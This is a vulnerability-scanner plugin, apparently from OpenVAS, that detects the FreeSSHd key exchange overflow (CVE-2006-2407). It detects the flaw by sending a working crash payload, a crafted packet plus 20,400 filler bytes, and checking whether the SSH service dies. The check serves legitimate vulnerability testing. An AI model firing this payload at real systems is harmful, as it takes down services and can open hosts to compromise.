# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200012");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2407");
  script_name("FreeSSHD Key Exchange Buffer Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/freesshd/detected");

  script_tag(name:"summary", value:"A vulnerable version of FreeSSHd is installed on
  the remote host.");

  script_tag(name:"impact", value:"The version installed does not validate key exchange strings
  send by a SSH client. This results in a buffer overflow and possible a compromise of the host
  if the client is sending a long key exchange string.

  Note :

  At this point the FreeSSHD Service is reported down. You should start it manually again.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the latest release.
  See the references for more information.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/19846");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17958");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");
include("ssh_func.inc");

port = ssh_get_port(default:22);
soc = open_sock_tcp(port);
if (!soc) exit(0);

banner = recv(socket:soc, length:128);
if (egrep(pattern:"SSH.+WeOnlyDo", string:banner)) {

  ident = "SSH-2.0-OpenSSH_4.2p1";
  exp = ident +
        raw_string(0x0a, 0x00, 0x00, 0x4f, 0x04, 0x05,
                   0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xde)
               + crap(length:20400);

  send(socket:soc, data:exp);
  recv(socket:soc, length:1024);
  close(soc);

  soc = open_sock_tcp(port);
  if (soc) {
    recv = recv(socket:soc, length:128);
    close (soc);
  }
  if (!soc || (!strlen(recv))) {
    security_message(port:port);
  }
}

exit(0);
